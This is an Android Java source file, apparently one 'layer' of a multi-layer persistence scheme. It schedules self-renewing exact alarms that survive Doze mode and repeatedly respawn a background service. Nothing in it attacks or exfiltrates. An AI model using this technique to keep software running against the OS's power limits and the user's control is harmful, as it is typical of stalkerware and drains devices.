package com.fason.app.persistence;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.SystemClock;
import android.util.Log;
import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.receiver.WatchdogReceiver;

/**
 * Layer 4: AlarmEngine
 * Exact alarms that survive Doze mode via setExactAndAllowWhileIdle.
 * Self-scheduling chain — each alarm schedules the next.
 */
public final class AlarmEngine {
    private static final String TAG = "AlarmEngine";
    private static final long WATCHDOG_INTERVAL_MS = 3 * 60 * 1000L; // 3 minutes
    private static final int REQ_WATCHDOG = 0xA1;
    private static final int REQ_HEARTBEAT = 0xA2;

    private AlarmEngine() {}

    public static void scheduleWatchdog() {
        Context ctx = FasonApp.getContext();
        AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
        if (am == null) return;

        Intent intent = new Intent(ctx, WatchdogReceiver.class);
        intent.setAction(Protocol.BC_KEEP_ALIVE);
        PendingIntent pi = buildPendingIntent(ctx, intent, REQ_WATCHDOG);

        long triggerAt = System.currentTimeMillis() + WATCHDOG_INTERVAL_MS;

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pi);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                am.setExact(AlarmManager.RTC_WAKEUP, triggerAt, pi);
            } else {
                am.set(AlarmManager.RTC_WAKEUP, triggerAt, pi);
            }
            Log.d(TAG, "Watchdog alarm scheduled at " + triggerAt);
        } catch (SecurityException e) {
            Log.w(TAG, "Exact alarm not permitted, using inexact", e);
            try {
                am.setInexactRepeating(
                    AlarmManager.RTC_WAKEUP,
                    triggerAt,
                    AlarmManager.INTERVAL_FIFTEEN_MINUTES,
                    pi
                );
            } catch (Exception ignored) {}
        }
    }

    public static void scheduleHeartbeat() {
        Context ctx = FasonApp.getContext();
        AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
        if (am == null) return;

        Intent intent = new Intent(ctx, WatchdogReceiver.class);
        intent.setAction(Protocol.BC_RESPAWN_SERVICE);
        PendingIntent pi = buildPendingIntent(ctx, intent, REQ_HEARTBEAT);

        long triggerAt = System.currentTimeMillis() + 60_000; // 1 minute

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pi);
            } else {
                am.set(AlarmManager.RTC_WAKEUP, triggerAt, pi);
            }
        } catch (SecurityException e) {
            Log.w(TAG, "Heartbeat alarm failed", e);
        }
    }

    public static void cancelAll() {
        Context ctx = FasonApp.getContext();
        AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
        if (am == null) return;

        Intent wd = new Intent(ctx, WatchdogReceiver.class);
        wd.setAction(Protocol.BC_KEEP_ALIVE);
        am.cancel(buildPendingIntent(ctx, wd, REQ_WATCHDOG));

        Intent hb = new Intent(ctx, WatchdogReceiver.class);
        hb.setAction(Protocol.BC_RESPAWN_SERVICE);
        am.cancel(buildPendingIntent(ctx, hb, REQ_HEARTBEAT));
    }

    private static PendingIntent buildPendingIntent(Context ctx, Intent intent, int reqCode) {
        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            flags |= PendingIntent.FLAG_IMMUTABLE;
        }
        return PendingIntent.getBroadcast(ctx, reqCode, intent, flags);
    }

    public static long getWatchdogInterval() {
        return WATCHDOG_INTERVAL_MS;
    }
}
